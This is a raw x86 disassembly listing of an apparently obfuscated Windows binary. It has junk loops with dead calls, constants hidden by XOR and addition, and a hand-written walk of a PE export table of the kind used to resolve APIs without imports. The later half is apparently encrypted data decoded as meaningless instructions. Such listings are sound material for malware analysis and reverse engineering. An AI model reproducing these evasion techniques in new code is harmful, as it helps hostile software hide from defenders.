  40d554:	push   0x6e05
  40d559:	call   DWORD PTR ds:0x43c9a0
  40d55f:	cmp    DWORD PTR ds:0x4377bb,0x8
  40d566:	jne    0x40d579
  40d56c:	mov    ecx,DWORD PTR ds:0x4377bb
  40d572:	inc    ecx
  40d573:	mov    DWORD PTR ds:0x4377bb,ecx
  40d579:	jmp    0x40d512
  40d57e:	mov    eax,DWORD PTR [ebp-0x44]
  40d581:	and    DWORD PTR ds:0x437777,0x0
  40d58b:	xor    ecx,ecx
  40d58d:	xor    ecx,DWORD PTR ds:0x437777
  40d593:	inc    ecx
  40d594:	mov    DWORD PTR ds:0x437777,ecx
  40d59a:	cmp    DWORD PTR ds:0x437777,0x1b
  40d5a1:	jb     0x40d5c9
  40d5a7:	jmp    0x40d5bc
  40d5ac:	push   0x80b4
  40d5b1:	push   0x2f38
  40d5b6:	call   DWORD PTR ds:0x43c9a4
  40d5bc:	cmp    DWORD PTR ds:0x437777,0x13
  40d5c3:	jb     0x40d58b
  40d5c9:	sub    eax,0x3272fb
  40d5ce:	sbb    DWORD PTR ds:0x43776f,edx
  40d5d4:	xor    eax,0x75108b5
  40d5d9:	sbb    ecx,DWORD PTR ds:0x43775b
  40d5df:	mov    ecx,DWORD PTR [ebp-0x4]
  40d5e2:	sub    ecx,0x3272fb
  40d5e8:	sbb    DWORD PTR ds:0x4377b3,0x1661
  40d5f2:	xor    ecx,0x75108b5
  40d5f8:	mov    DWORD PTR ds:0x437723,0x6ceb
  40d602:	cmp    eax,ecx
  40d604:	mov    DWORD PTR ds:0x43770f,0xe30
  40d60e:	je     0x4125fe
  40d614:	mov    eax,DWORD PTR [ebp-0x3c]
  40d617:	xor    eax,0x75108b5
  40d61c:	add    eax,0x3272fb
  40d621:	cmp    DWORD PTR [ebp-0x44],eax
  40d624:	mov    DWORD PTR ds:0x43778b,0x71e8
  40d62e:	jne    0x40de86
  40d634:	mov    DWORD PTR ds:0x437783,0x16
  40d63e:	cmp    DWORD PTR ds:0x437783,0x0
  40d645:	je     0x40d696
  40d64b:	cmp    DWORD PTR ds:0x437783,0x4
  40d652:	jg     0x40d696
  40d658:	jmp    0x40d66b
  40d65d:	push   0x28fc
  40d662:	push   DWORD PTR [ebp-0x20]
  40d665:	call   DWORD PTR ds:0x43c9a8
  40d66b:	cmp    DWORD PTR ds:0x437783,0x5
  40d672:	jne    0x40d683
  40d678:	mov    eax,ds:0x437783
  40d67d:	dec    eax
  40d67e:	mov    ds:0x437783,eax
  40d683:	xor    eax,eax
  40d685:	xor    eax,DWORD PTR ds:0x437783
  40d68b:	dec    eax
  40d68c:	mov    ds:0x437783,eax
  40d691:	jmp    0x40d63e
  40d696:	mov    eax,DWORD PTR [ebp+0x8]
  40d699:	mov    DWORD PTR [ebp-0x58],eax
  40d69c:	mov    DWORD PTR ds:0x43775f,0x4c77
  40d6a6:	mov    DWORD PTR [ebp-0x50],0xf89c85b0
  40d6ad:	mov    eax,DWORD PTR [ebp-0x58]
  40d6b0:	or     DWORD PTR ds:0x43775b,0x43776f
  40d6ba:	movsx  eax,BYTE PTR [eax]
  40d6bd:	cdq    
  40d6be:	xor    DWORD PTR ds:0x437753,0x4377bb
  40d6c8:	sub    eax,0x5424137
  40d6cd:	mov    DWORD PTR ds:0x43775f,0x3435
  40d6d7:	sbb    edx,0x0
  40d6da:	xor    eax,0x8a29a14b
  40d6df:	and    DWORD PTR ds:0x43776f,0x4377ab
  40d6e9:	xor    edx,0x0
  40d6ec:	mov    DWORD PTR ds:0x43773f,0x124f
  40d6f6:	mov    DWORD PTR [ebp-0x144],eax
  40d6fc:	mov    DWORD PTR [ebp-0x140],edx
  40d702:	mov    DWORD PTR ds:0x4377ab,0x7835
  40d70c:	cmp    DWORD PTR [ebp-0x144],0x70941e5d
  40d716:	mov    DWORD PTR ds:0x43776f,0x724a
  40d720:	jne    0x40d88d
  40d726:	mov    DWORD PTR ds:0x43778b,0x6e67
  40d730:	cmp    DWORD PTR [ebp-0x140],0xffffffff
  40d737:	mov    DWORD PTR ds:0x43778f,0x1a8
  40d741:	jne    0x40d88d
  40d747:	adc    ecx,0x38df
  40d74d:	mov    eax,DWORD PTR [ebp-0x58]
  40d750:	and    ecx,DWORD PTR ds:0x437787
  40d756:	mov    ecx,DWORD PTR [ebp-0x58]
  40d759:	add    ecx,DWORD PTR [eax+0x3c]
  40d75c:	and    DWORD PTR ds:0x43771f,0x0
  40d766:	xor    eax,eax
  40d768:	add    eax,DWORD PTR ds:0x43771f
  40d76e:	inc    eax
  40d76f:	mov    ds:0x43771f,eax
  40d774:	cmp    DWORD PTR ds:0x43771f,0xd
  40d77b:	ja     0x40d7bb
  40d781:	jmp    0x40d796
  40d786:	push   0x43772b
  40d78b:	push   0x5f6b
  40d790:	call   DWORD PTR ds:0x43c9ac
  40d796:	cmp    DWORD PTR ds:0x43771f,0xc
  40d79d:	jne    0x40d7ae
  40d7a3:	mov    eax,ds:0x43771f
  40d7a8:	inc    eax
  40d7a9:	mov    ds:0x43771f,eax
  40d7ae:	cmp    DWORD PTR ds:0x43771f,0x18
  40d7b5:	jb     0x40d766
  40d7bb:	mov    DWORD PTR [ebp-0x54],ecx
  40d7be:	and    DWORD PTR ds:0x437777,ebx
  40d7c4:	mov    eax,DWORD PTR [ebp-0x50]
  40d7c7:	and    DWORD PTR ds:0x43778b,0x0
  40d7d1:	mov    ecx,DWORD PTR ds:0x43778b
  40d7d7:	inc    ecx
  40d7d8:	mov    DWORD PTR ds:0x43778b,ecx
  40d7de:	cmp    DWORD PTR ds:0x43778b,0xb
  40d7e5:	ja     0x40d823
  40d7eb:	jmp    0x40d7fc
  40d7f0:	push   DWORD PTR [ebp-0x24]
  40d7f3:	push   DWORD PTR [ebp-0x1c]
  40d7f6:	call   DWORD PTR ds:0x43c9b0
  40d7fc:	cmp    DWORD PTR ds:0x43778b,0xa
  40d803:	jne    0x40d816
  40d809:	mov    ecx,DWORD PTR ds:0x43778b
  40d80f:	inc    ecx
  40d810:	mov    DWORD PTR ds:0x43778b,ecx
  40d816:	cmp    DWORD PTR ds:0x43778b,0x19
  40d81d:	jb     0x40d7d1
  40d823:	xor    eax,0x75108b5
  40d828:	xor    DWORD PTR ds:0x43771b,0x4377a3
  40d832:	add    eax,0x3272fb
  40d837:	mov    ecx,DWORD PTR ds:0x43771b
  40d83d:	mov    ecx,DWORD PTR [ebp-0x54]
  40d840:	cmp    DWORD PTR [ecx+0x54],eax
  40d843:	je     0x40d85e
  40d849:	mov    eax,DWORD PTR [ebp-0x54]
  40d84c:	mov    DWORD PTR ds:0x437723,0x3d6
  40d856:	mov    DWORD PTR [ebp-0x5c],eax
  40d859:	jmp    0x40d8b7
  40d85e:	sbb    eax,DWORD PTR ds:0x437797
  40d864:	mov    eax,DWORD PTR [ebp-0x50]
  40d867:	adc    DWORD PTR ds:0x43772b,0x43775b
  40d871:	xor    eax,0x75108b5
  40d876:	add    eax,0x3272fb
  40d87b:	mov    DWORD PTR ds:0x437723,0x699f
  40d885:	mov    DWORD PTR [ebp-0x5c],eax
  40d888:	jmp    0x40d8b7
  40d88d:	mov    eax,ds:0x4377ab
  40d892:	sbb    eax,DWORD PTR ds:0x437777
  40d898:	mov    ds:0x4377ab,eax
  40d89d:	mov    eax,DWORD PTR [ebp-0x50]
  40d8a0:	and    DWORD PTR ds:0x437727,0x192e
  40d8aa:	xor    eax,0x75108b5
  40d8af:	add    eax,0x3272fb
  40d8b4:	mov    DWORD PTR [ebp-0x5c],eax
  40d8b7:	and    DWORD PTR ds:0x4377bb,edx
  40d8bd:	mov    eax,DWORD PTR [ebp-0x5c]
  40d8c0:	mov    DWORD PTR [ebp-0x18],eax
  40d8c3:	sbb    DWORD PTR ds:0x437743,0x1fc4
  40d8cd:	mov    eax,DWORD PTR [ebp-0x3c]
  40d8d0:	add    DWORD PTR ds:0x43774b,0x43776f
  40d8da:	xor    eax,0x75108b5
  40d8df:	add    eax,0x3272fb
  40d8e4:	mov    DWORD PTR ds:0x437737,0x3ad8
  40d8ee:	cmp    DWORD PTR [ebp-0x18],eax
  40d8f1:	mov    DWORD PTR ds:0x43779b,0x476a
  40d8fb:	jne    0x40d940
  40d901:	adc    DWORD PTR ds:0x43771f,0x22a8
  40d90b:	mov    eax,DWORD PTR [ebp-0x3c]
  40d90e:	sbb    DWORD PTR ds:0x437777,0x437773
  40d918:	xor    eax,0x75108b5
  40d91d:	sub    DWORD PTR ds:0x43770f,0x715d
  40d927:	add    eax,0x3272fb
  40d92c:	mov    DWORD PTR ds:0x43774f,0x301
  40d936:	jmp    0x414dde
  40d93b:	jmp    0x40de5d
  40d940:	and    DWORD PTR ds:0x43779b,0x0
  40d94a:	jmp    0x40d95d
  40d94f:	xor    eax,eax
  40d951:	or     eax,DWORD PTR ds:0x43779b
  40d957:	inc    eax
  40d958:	mov    ds:0x43779b,eax
  40d95d:	cmp    DWORD PTR ds:0x43779b,0x10
  40d964:	jae    0x40d996
  40d96a:	cmp    DWORD PTR ds:0x43779b,0x1d
  40d971:	jbe    0x40d996
  40d977:	jmp    0x40d991
  40d97c:	push   0x43773f
  40d981:	push   0x437777
  40d986:	push   0x3430
  40d98b:	call   DWORD PTR ds:0x43c9b4
  40d991:	jmp    0x40d94f
  40d996:	mov    eax,DWORD PTR [ebp-0x18]
  40d999:	mov    DWORD PTR [ebp-0x7c],eax
  40d99c:	mov    eax,DWORD PTR [ebp+0x8]
  40d99f:	mov    DWORD PTR [ebp-0x78],eax
  40d9a2:	add    eax,0x76e2
  40d9a7:	mov    DWORD PTR [ebp-0x60],0xf89c85b0
  40d9ae:	add    edx,eax
  40d9b0:	mov    DWORD PTR [ebp-0x64],0xf89c85b3
  40d9b7:	mov    eax,DWORD PTR [ebp-0x7c]
  40d9ba:	mov    ecx,DWORD PTR [ebp-0x64]
  40d9bd:	adc    DWORD PTR ds:0x43773f,0x7640
  40d9c7:	xor    ecx,0x75108b5
  40d9cd:	add    ecx,0x3272fb
  40d9d3:	and    DWORD PTR ds:0x43779b,0x0
  40d9dd:	jmp    0x40d9ef
  40d9e2:	mov    edx,DWORD PTR ds:0x43779b
  40d9e8:	inc    edx
  40d9e9:	mov    DWORD PTR ds:0x43779b,edx
  40d9ef:	cmp    DWORD PTR ds:0x43779b,0x17
  40d9f6:	jae    0x40da40
  40d9fc:	cmp    DWORD PTR ds:0x43779b,0xa
  40da03:	ja     0x40da40
  40da09:	jmp    0x40da21
  40da0e:	push   DWORD PTR [ebp-0x1c]
  40da11:	push   0x43779b
  40da16:	push   0x437124
  40da1b:	call   DWORD PTR ds:0x43c9b8
  40da21:	cmp    DWORD PTR ds:0x43779b,0x9
  40da28:	jne    0x40da3b
  40da2e:	mov    edx,DWORD PTR ds:0x43779b
  40da34:	inc    edx
  40da35:	mov    DWORD PTR ds:0x43779b,edx
  40da3b:	jmp    0x40d9e2
  40da40:	mov    edx,DWORD PTR [ebp-0x60]
  40da43:	xor    edx,0x75108b5
  40da49:	add    edx,0x3272fb
  40da4f:	xor    DWORD PTR ds:0x43777f,0x437757
  40da59:	imul   ecx,edx
  40da5c:	cmp    eax,ecx
  40da5e:	mov    DWORD PTR ds:0x437747,0x39af
  40da68:	jne    0x40dadd
  40da6e:	sbb    eax,eax
  40da70:	mov    eax,DWORD PTR [ebp-0x64]
  40da73:	sub    DWORD PTR ds:0x43779b,ebx
  40da79:	xor    eax,0x75108b5
  40da7e:	movzx  ecx,BYTE PTR ds:0x43773f
  40da85:	add    DWORD PTR ds:0x437767,ecx
  40da8b:	add    eax,0x3272fb
  40da90:	add    DWORD PTR ds:0x437727,ecx
  40da96:	mov    ecx,DWORD PTR [ebp-0x60]
  40da99:	xor    ecx,0x75108b5
  40da9f:	and    DWORD PTR ds:0x437793,0x4377b7
  40daa9:	add    ecx,0x3272fb
  40daaf:	and    DWORD PTR ds:0x43770f,0x10c
  40dab9:	imul   eax,ecx
  40dabc:	mov    DWORD PTR ds:0x43778f,0x70da
  40dac6:	mov    DWORD PTR [ebp-0x80],eax
  40dac9:	mov    DWORD PTR ds:0x43772b,0x2b15
  40dad3:	jmp    0x40de20
  40dad8:	jmp    0x40de00
  40dadd:	lea    eax,[ebp-0x70]
  40dae0:	mov    DWORD PTR ds:0x43779b,0x12
  40daea:	cmp    DWORD PTR ds:0x43779b,0x0
  40daf1:	je     0x40db28
  40daf7:	cmp    DWORD PTR ds:0x43779b,0x1e
  40dafe:	jbe    0x40db28
  40db04:	jmp    0x40db14
  40db09:	push   0x8f8f
  40db0e:	call   DWORD PTR ds:0x43c9bc
  40db14:	xor    ecx,ecx
  40db16:	add    ecx,DWORD PTR ds:0x43779b
  40db1c:	dec    ecx
  40db1d:	mov    DWORD PTR ds:0x43779b,ecx
  40db23:	jmp    0x40daea
  40db28:	mov    DWORD PTR [ebp-0x6c],eax
  40db2b:	mov    DWORD PTR ds:0x437753,0x63cd
  40db35:	mov    eax,DWORD PTR [ebp-0x6c]
  40db38:	mov    DWORD PTR [eax],0xf89c85b0
  40db3e:	mov    edx,DWORD PTR ds:0x43771f
  40db44:	sub    DWORD PTR ds:0x43771b,edx
  40db4a:	mov    eax,DWORD PTR [ebp-0x70]
  40db4d:	xor    eax,0x75108b5
  40db52:	and    DWORD PTR ds:0x4377b3,0x0
  40db5c:	jmp    0x40db6e
  40db61:	mov    edx,DWORD PTR ds:0x4377b3
  40db67:	inc    edx
  40db68:	mov    DWORD PTR ds:0x4377b3,edx
  40db6e:	cmp    DWORD PTR ds:0x4377b3,0x1b
  40db75:	jae    0x40db9b
  40db7b:	cmp    DWORD PTR ds:0x4377b3,0x27
  40db82:	jl     0x40db9b
  40db88:	jmp    0x40db96
  40db8d:	push   DWORD PTR [ebp-0x24]
  40db90:	call   DWORD PTR ds:0x43c9c4
  40db96:	jmp    0x40db61
  40db9b:	mov    ecx,DWORD PTR [ebp-0x7c]
  40db9e:	mov    DWORD PTR ds:0x437737,0x11
  40dba8:	cmp    DWORD PTR ds:0x437737,0x0
  40dbaf:	je     0x40dc08
  40dbb5:	cmp    DWORD PTR ds:0x437737,0x4
  40dbbc:	jbe    0x40dc08
  40dbc2:	jmp    0x40dbda
  40dbc7:	push   0x43713c
  40dbcc:	push   0x437104
  40dbd1:	push   DWORD PTR [ebp-0x1c]
  40dbd4:	call   DWORD PTR ds:0x43c9c8
  40dbda:	cmp    DWORD PTR ds:0x437737,0x5
  40dbe1:	jne    0x40dbf6
  40dbe7:	xor    edx,edx
  40dbe9:	add    edx,DWORD PTR ds:0x437737
  40dbef:	dec    edx
  40dbf0:	mov    DWORD PTR ds:0x437737,edx
  40dbf6:	mov    edx,DWORD PTR ds:0x437737
  40dbfc:	dec    edx
  40dbfd:	mov    DWORD PTR ds:0x437737,edx
  40dc03:	jmp    0x40dba8
  40dc08:	mov    eax,DWORD PTR [ecx+eax*8+0x1939850]
  40dc0f:	mov    DWORD PTR [ebp-0x68],eax
  40dc12:	and    ecx,DWORD PTR ds:0x43776b
  40dc18:	mov    eax,DWORD PTR [ebp-0x68]
  40dc1b:	mov    ecx,DWORD PTR [ebp-0x64]
  40dc1e:	sbb    DWORD PTR ds:0x43778b,0x5d76
  40dc28:	xor    ecx,0x75108b5
  40dc2e:	add    ecx,0x3272fb
  40dc34:	mov    edx,DWORD PTR [ebp-0x60]
  40dc37:	sub    DWORD PTR ds:0x43776f,0x437717
  40dc41:	xor    edx,0x75108b5
  40dc47:	add    edx,0x3272fb
  40dc4d:	adc    DWORD PTR ds:0x437733,0x2ce3
  40dc57:	imul   ecx,edx
  40dc5a:	mov    DWORD PTR ds:0x4377a3,0x769c
  40dc64:	cmp    eax,ecx
  40dc66:	mov    DWORD PTR ds:0x437773,0x7b44
  40dc70:	je     0x40dcd1
  40dc76:	mov    eax,DWORD PTR [ebp-0x64]
  40dc79:	sbb    DWORD PTR ds:0x43778b,0x52d3
  40dc83:	xor    eax,0x75108b5
  40dc88:	add    DWORD PTR ds:0x437793,0x279
  40dc92:	add    eax,0x3272fb
  40dc97:	mov    ecx,DWORD PTR [ebp-0x68]
  40dc9a:	imul   eax,ecx
  40dc9d:	add    DWORD PTR ds:0x4377bb,0x1ffc
  40dca7:	add    eax,DWORD PTR [ebp-0x78]
  40dcaa:	mov    DWORD PTR [ebp-0x74],eax
  40dcad:	mov    eax,DWORD PTR [ebp-0x74]
  40dcb0:	mov    DWORD PTR ds:0x43772f,0x1a32
  40dcba:	mov    DWORD PTR [ebp-0x80],eax
  40dcbd:	mov    DWORD PTR ds:0x43773f,0x4cc2
  40dcc7:	jmp    0x40de20
  40dccc:	jmp    0x40ddc7
  40dcd1:	mov    DWORD PTR ds:0x437743,0x12
  40dcdb:	cmp    DWORD PTR ds:0x437743,0x0
  40dce2:	je     0x40dd20
  40dce8:	cmp    DWORD PTR ds:0x437743,0x1f
  40dcef:	jbe    0x40dd20
  40dcf5:	jmp    0x40dd10
  40dcfa:	push   0x3dfe
  40dcff:	push   DWORD PTR [ebp-0x18]
  40dd02:	push   DWORD PTR [ebp-0x28]
  40dd05:	push   0x437000
  40dd0a:	call   DWORD PTR ds:0x43c9cc
  40dd10:	mov    eax,ds:0x437743
  40dd15:	dec    eax
  40dd16:	mov    ds:0x437743,eax
  40dd1b:	jmp    0x40dcdb
  40dd20:	mov    eax,DWORD PTR [ebp-0x64]
  40dd23:	dec    ecx
  40dd24:	xor    eax,0x75108b5
  40dd29:	adc    ecx,DWORD PTR ds:0x43779f
  40dd2f:	add    eax,0x3272fb
  40dd34:	and    DWORD PTR ds:0x43771f,0x0
  40dd3e:	mov    ecx,DWORD PTR ds:0x43771f
  40dd44:	inc    ecx
  40dd45:	mov    DWORD PTR ds:0x43771f,ecx
  40dd4b:	cmp    DWORD PTR ds:0x43771f,0x27
  40dd52:	jg     0x40dd8f
  40dd58:	jmp    0x40dd82
  40dd5d:	push   DWORD PTR [ebp-0xc]
  40dd60:	push   0x6584
  40dd65:	push   0x4377af
  40dd6a:	push   DWORD PTR [ebp-0x24]
  40dd6d:	push   0x1eb1
  40dd72:	push   0x5818
  40dd77:	push   0x1de6
  40dd7c:	call   DWORD PTR ds:0x43c9d0
  40dd82:	cmp    DWORD PTR ds:0x43771f,0x1c
  40dd89:	jb     0x40dd3e
  40dd8f:	mov    ecx,DWORD PTR [ebp-0x60]
  40dd92:	xor    ecx,0x75108b5
  40dd98:	xor    DWORD PTR ds:0x437713,0x26bd
  40dda2:	add    ecx,0x3272fb
  40dda8:	imul   eax,ecx
  40ddab:	mov    DWORD PTR ds:0x43778b,0x2ea1
  40ddb5:	mov    DWORD PTR [ebp-0x80],eax
  40ddb8:	mov    DWORD PTR ds:0x43778b,0x4108
  40ddc2:	jmp    0x40de20
  40ddc7:	sub    DWORD PTR ds:0x43778b,edx
  40ddcd:	mov    eax,DWORD PTR [ebp-0x60]
  40ddd0:	xor    DWORD PTR ds:0x437747,0x2583
  40ddda:	xor    eax,0x75108b5
  40dddf:	xor    DWORD PTR ds:0x43779b,0x437773
  40dde9:	add    eax,0x3272fb
  40ddee:	mov    DWORD PTR ds:0x43779b,0x27ba
  40ddf8:	mov    DWORD PTR [ebp-0x80],eax
  40ddfb:	jmp    0x40de20
  40de00:	sub    DWORD PTR ds:0x43777f,edi
  40de06:	mov    eax,DWORD PTR [ebp-0x60]
  40de09:	xor    eax,0x75108b5
  40de0e:	add    eax,0x3272fb
  40de13:	sbb    DWORD PTR ds:0x43771f,0x437737
  40de1d:	mov    DWORD PTR [ebp-0x80],eax
  40de20:	and    eax,DWORD PTR ds:0x437793
  40de26:	mov    eax,DWORD PTR [ebp-0x80]
  40de29:	mov    DWORD PTR [ebp-0x30],eax
  40de2c:	mov    eax,DWORD PTR [ebp-0x3c]
  40de2f:	xor    eax,0x75108b5
  40de34:	add    eax,0x3272fb
  40de39:	cmp    DWORD PTR [ebp-0x30],eax
  40de3c:	jne    0x40de54
  40de42:	mov    eax,DWORD PTR [ebp-0x3c]
  40de45:	xor    eax,0x75108b5
  40de4a:	add    eax,0x3272fb
  40de4f:	jmp    0x414dde
  40de54:	mov    eax,DWORD PTR [ebp-0x30]
  40de57:	mov    eax,DWORD PTR [eax+0x18]
  40de5a:	mov    DWORD PTR [ebp-0x4],eax
  40de5d:	mov    eax,DWORD PTR [ebp-0x30]
  40de60:	mov    ecx,DWORD PTR [ebp+0x8]
  40de63:	add    ecx,DWORD PTR [eax+0x20]
  40de66:	mov    DWORD PTR [ebp-0xc],ecx
  40de69:	mov    eax,DWORD PTR [ebp-0x30]
  40de6c:	mov    ecx,DWORD PTR [ebp+0x8]
  40de6f:	add    ecx,DWORD PTR [eax+0x24]
  40de72:	mov    DWORD PTR [ebp-0x24],ecx
  40de75:	mov    eax,DWORD PTR [ebp-0x30]
  40de78:	mov    ecx,DWORD PTR [ebp+0x8]
  40de7b:	add    ecx,DWORD PTR [eax+0x1c]
  40de7e:	mov    DWORD PTR [ebp-0x20],ecx
  40de81:	jmp    0x41023e
  40de86:	mov    eax,DWORD PTR [ebp-0x44]
  40de89:	mov    ecx,DWORD PTR [ebp-0xc]
  40de8c:	mov    edx,DWORD PTR [ebp+0x8]
  40de8f:	jmp    0x410218
  40de94:	in     al,0xfc
  40de96:	xchg   esi,eax
  40de97:	sub    BYTE PTR [esi+0x30],dh
  40de9a:	fs push esp
  40de9c:	jbe    0x40de3b
  40de9e:	jmp    0x40deb3
  40dea0:	mov    eax,ds:0x6e6f4e1d
  40dea5:	and    al,0x7b
  40dea7:	jnp    0x40de90
  40dea9:	cwde   
  40deaa:	jnp    0x40df27
  40deac:	loopne 0x40deb1
  40deae:	stc    
  40deaf:	add    eax,0x2eef50f
  40deb4:	fdivrp st(2),st
  40deb6:	add    al,0xdf
  40deb8:	ret    
  40deb9:	mov    ebp,0xc1aed4e4
  40debe:	jmp    0x40de90
  40dec0:	(bad)  
  40dec1:	(bad)  
  40dec2:	(bad)  
  40dec3:	icebp  
  40dec4:	(bad)  
  40dec5:	jmp    0xdb399fcd
  40deca:	push   es
  40decb:	aam    0xf1
  40decd:	xlat   BYTE PTR ds:[ebx]
  40dece:	jecxz  0x40decc
  40ded0:	ret    0x3fe
  40ded3:	jecxz  0x40de97
  40ded5:	repz (bad) 
  40ded7:	lods   al,BYTE PTR ds:[esi]
  40ded8:	lods   al,BYTE PTR ds:[esi]
  40ded9:	loope  0x40debb
  40dedb:	jmp    0xcad1:0xf2f4e5ae
  40dee2:	fdivrp st(3),st
  40dee4:	int    0xed
  40dee6:	fst    st(3)
  40dee8:	call   0xf93ee1ab
  40deed:	(bad)  
  40deee:	mov    esp,0x2dee7ea
  40def3:	out    dx,al
  40def4:	in     eax,0xcf
  40def6:	fucom  st(6)
  40def8:	stos   BYTE PTR es:[edi],al
  40def9:	iret   
  40defa:	enter  0xb3ad,0xc9
  40defe:	stc    
  40deff:	neg    edx
  40df01:	test   ah,0xd1
  40df04:	(bad)  
  40df05:	call   0xfa04bade
  40df0a:	fmulp  st(5),st
  40df0c:	(bad)  
  40df0d:	aad    0xf8
  40df0f:	(bad)  
  40df10:	fsub   st(1),st
  40df12:	cli    
  40df13:	fcmovnu st,st(4)
  40df15:	out    dx,eax
  40df16:	repnz lods eax,DWORD PTR ds:[esi]
  40df18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df19:	shr    BYTE PTR [ebp-0x384f2f31],1
  40df1f:	loopne 0x40df10
  40df21:	in     eax,0xd9
  40df23:	clc    
  40df24:	cld    
  40df25:	(bad)  
  40df27:	inc    DWORD PTR [ebx]
  40df29:	shl    bl,1
  40df2b:	lock cmc 
  40df2d:	ftst   
  40df2f:	shl    ebp,1
  40df31:	stc    
  40df32:	or     al,bl
  40df34:	loope  0x40df32
  40df36:	clc    
  40df37:	int3   
  40df38:	rol    edi,0xeb
  40df3b:	jecxz  0x40df25
  40df3d:	repz int 0xc4
  40df40:	rcl    ah,cl
  40df42:	mov    al,0xc8
  40df44:	out    dx,eax
  40df45:	(bad)  
  40df47:	idiv   BYTE PTR [edx-0x412d2a2b]
  40df4d:	fild   WORD PTR [eax+edi*8]
  40df50:	(bad)  
  40df52:	cld    
  40df53:	(bad)  
  40df55:	clc    
  40df56:	fsubp  st(7),st
  40df58:	scas   al,BYTE PTR es:[edi]
  40df59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df5a:	shl    dl,0xe1
  40df5d:	(bad)
  40df60:	loopne 0x40df31
  40df62:	(bad)  
  40df64:	sti    
  40df65:	mov    edx,0xe6cde8d5
  40df6a:	rcr    edi,cl
  40df6c:	rol    DWORD PTR [edi],1
  40df6e:	(bad)  
  40df6f:	out    0x3,eax
  40df71:	in     eax,0xe4
  40df73:	(bad)  
  40df74:	sti    
  40df75:	jmp    0x40df4a
  40df77:	icebp  
  40df78:	test   al,0xd1
  40df7a:	(bad)  
  40df7b:	rcl    ebx,1
  40df7d:	fucomi st,st(7)
  40df7f:	cli    
  40df80:	mov    ch,0xd0
  40df82:	enter  0xcdb5,0xf0
  40df86:	aam    0xd8
  40df88:	rol    ecx,1
  40df8a:	in     eax,dx
  40df8b:	repz lock ret 
  40df8e:	mul    bh
  40df90:	fdivrp st(4),st
  40df92:	clc    
  40df93:	retf   
  40df94:	aam    0xe8
  40df96:	add    al,0xd9
  40df98:	mov    eax,0xf6c8c2e9
  40df9d:	xlat   BYTE PTR ds:[ebx]
  40df9e:	shl    dl,0xd2
  40dfa1:	out    0xfe,eax
  40dfa3:	xlat   BYTE PTR ds:[ebx]
  40dfa4:	rcl    ch,1
  40dfa6:	aad    0xc1
  40dfa8:	fidivr WORD PTR [ecx-0x180d2541]
  40dfae:	add    eax,0xc5fbd6c2
  40dfb3:	out    0xe9,al
  40dfb5:	out    0x3,eax
  40dfb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfb8:	scas   eax,DWORD PTR es:[edi]
  40dfb9:	icebp  
  40dfba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfbb:	xlat   BYTE PTR ds:[ebx]
  40dfbc:	mov    dl,0xbb
  40dfbe:	call   0xde399a79
  40dfc3:	fcomip st,st(2)
  40dfc5:	fcmovbe st,st(1)
  40dfc7:	mov    eax,0x4f3f8bf
  40dfcc:	pop    es
  40dfcd:	(bad)  
  40dfce:	retf   
  40dfcf:	loope  0x40dfd3
  40dfd1:	fucomip st,st(6)
  40dfd3:	stc    
  40dfd4:	fsubp  st(0),st
  40dfd6:	or     eax,0xb0c6a8c9
  40dfdb:	aad    0xef
  40dfdd:	(bad)  
  40dfde:	loop   0x40dfd8
  40dfe0:	call   0xf311b3e3
  40dfe5:	fadd   st(2),st
  40dfe7:	call   0xd440c3e1
  40dfec:	add    eax,0xf8de0bcb
  40dff1:	(bad)  
  40dff2:	hlt    
  40dff3:	clc    
  40dff4:	dec    DWORD PTR [eax]
  40dff6:	icebp  
  40dff7:	sar    BYTE PTR [eax-0x28383024],1
  40dffd:	enter  0xe4db,0xe6
  40e001:	test   edi,0xdad2fcf9
  40e007:	mov    ebp,0xfce3f4dc
  40e00c:	cmc    
  40e00d:	ret    
  40e00e:	idiv   ebp
  40e010:	fdivp  st(1),st
  40e012:	cld    
  40e013:	or     al,0xc9
  40e015:	in     eax,0xd8
  40e017:	mov    dl,0xc4
  40e019:	test   eax,0xd1fbb6bd
  40e01e:	shl    dh,cl
  40e020:	leave  
  40e021:	in     eax,0xfa
  40e023:	stc    
  40e024:	mov    edi,0xbdf9fddb
  40e029:	fild   DWORD PTR [edi]
  40e02b:	clc    
  40e02c:	xlat   BYTE PTR ds:[ebx]
  40e02d:	jmp    0x9c6:0xc5e207c0
  40e034:	leave  
  40e035:	clc    
  40e036:	loopne 0x40e01b
  40e038:	in     al,dx
  40e039:	retf   0xc4cb
  40e03c:	loope  0x40e00e
  40e03e:	mov    ch,0xd9
  40e040:	mov    ch,0xf5
  40e042:	mov    edx,0xfaebdab3
  40e047:	loope  0x40e024
  40e049:	push   es
  40e04a:	into   
  40e04b:	fsub   st(4),st
  40e04d:	cld    
  40e04e:	add    ecx,edx
  40e050:	std    
  40e051:	mov    ebp,0xe6df04f8
  40e056:	or     al,0xca
  40e058:	mov    bl,0xe6
  40e05a:	mov    ebp,0xe0c3e7d3
  40e05f:	out    0xc5,eax
  40e061:	test   esi,0xcab103ba
  40e067:	mov    ebp,0xf3e6ddd9
  40e06c:	clc    
  40e06d:	fistp  QWORD PTR [eax-0x3a184129]
  40e073:	add    al,BYTE PTR [esi]
  40e075:	(bad)
  40e078:	ror    ecx,0xc2
  40e07b:	int    0xee
  40e07d:	(bad)  
  40e07e:	aam    0xf3
  40e080:	repnz fld1 
  40e083:	jmp    0x40e070
  40e085:	mov    esp,0xd107ede3
  40e08a:	icebp  
  40e08b:	out    0xc6,eax
  40e08d:	xlat   BYTE PTR ds:[ebx]
  40e08e:	add    esp,esp
  40e090:	in     eax,0xbd
  40e092:	out    0xef,al
  40e094:	out    dx,al
  40e095:	add    dl,ch
  40e097:	enter  0xe2cc,0xf2
  40e09b:	out    0xd7,eax
  40e09d:	mov    bl,0xed
  40e09f:	enter  0xb5f6,0xf0
  40e0a3:	shl    esi,1
  40e0a5:	faddp  st(2),st
  40e0a7:	mov    edx,0xf7d0f907
  40e0ac:	cld    
  40e0ad:	(bad)  
  40e0ae:	fneni(8087 only) 
  40e0b0:	imul   edx
  40e0b2:	into   
  40e0b3:	in     al,dx
  40e0b4:	fstp   st(5)
  40e0b6:	in     eax,dx
  40e0b7:	lds    esi,FWORD PTR [edx-0x19485719]
  40e0bd:	out    0xec,eax
  40e0bf:	mov    bh,0xd5
  40e0c1:	icebp  
  40e0c2:	aad    0xdf
  40e0c4:	fcomip st,st(7)
  40e0c6:	loop   0x40e0c8
